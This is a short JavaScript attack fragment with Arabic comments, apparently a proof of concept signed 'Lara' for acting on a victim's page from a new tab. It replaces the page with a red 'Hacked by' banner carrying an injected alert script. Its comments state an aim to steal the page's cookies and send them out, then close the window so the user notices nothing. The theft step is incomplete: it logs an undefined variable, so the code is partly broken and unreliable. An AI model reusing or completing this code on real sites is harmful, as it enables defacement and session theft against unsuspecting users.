// 1. طباعة علامة لارا في كونسول الصفحة الجديدة
console.log("Lara: Acting from the new tab...");


    // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
   document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by <script>alert(300);</script></h1>";
    
    // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
 
    console.log("Lara: Cookies from original page:", cookies);
    
    // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
    // window.close(); 

